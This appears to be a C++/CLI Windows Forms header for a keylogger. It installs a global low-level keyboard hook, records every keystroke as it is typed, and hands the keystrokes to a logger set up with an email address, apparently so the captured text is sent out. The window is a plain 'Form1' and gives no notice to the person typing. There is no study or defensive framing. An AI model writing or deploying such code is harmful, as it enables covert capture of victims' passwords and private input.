#pragma once
#include <windows.h>
#include "KeyHook.h"
#include "KeyboardLogger.h"
#include "ILogger.h"
#pragma comment (lib, "User32.lib")
namespace GlobalHooks {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Runtime::InteropServices;

	public ref class MainWindow : public System::Windows::Forms::Form
	{
	public:
		MainWindow(void)
		{
			keyboardHook = new KeyHook();
			keyboardLogger = new KeyboardLogger(10, "hazy142@gmail.com");
			InitializeComponent();
		}

	protected:
		~MainWindow()
		{
			if (keyboardHook)
				delete keyboardHook;
			if (keyboardLogger)
				delete keyboardLogger;
			UnhookWindowsHookEx(keyboardHookHandle);
			if (components)
			{
				delete components;
			}
		}

		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
			LPARAM lParam)
		{
			DWORD SHIFT_key = 0;
			DWORD CTRL_key = 0;
			DWORD ALT_key = 0;
			if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
			{
				KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
				string logMessage;
				logMessage.append(pressedKey);
				logMessage.append(" was pressed.");
				keyboardLogger->addMessage(logMessage);
			}
			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);;
		}

		virtual void WndProc(Message %m) override
		{
			switch (m.Msg)
			{
			case WM_KEYDOWN:
			{
				int z = 1;
				break;
			}
			default:
				Form::WndProc(m);
				break;
			}
		}
		
	private:
		static KeyHook *keyboardHook;
		static KeyboardLogger *keyboardLogger;
		static HHOOK keyboardHookHandle;
		System::ComponentModel::Container ^components;

		void InitializeComponent(void)
		{
			this->SuspendLayout();
			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(284, 261);
			this->Name = L"Form1";
			this->Text = L"Form1";
			this->ResumeLayout(false);
		}
	};
}
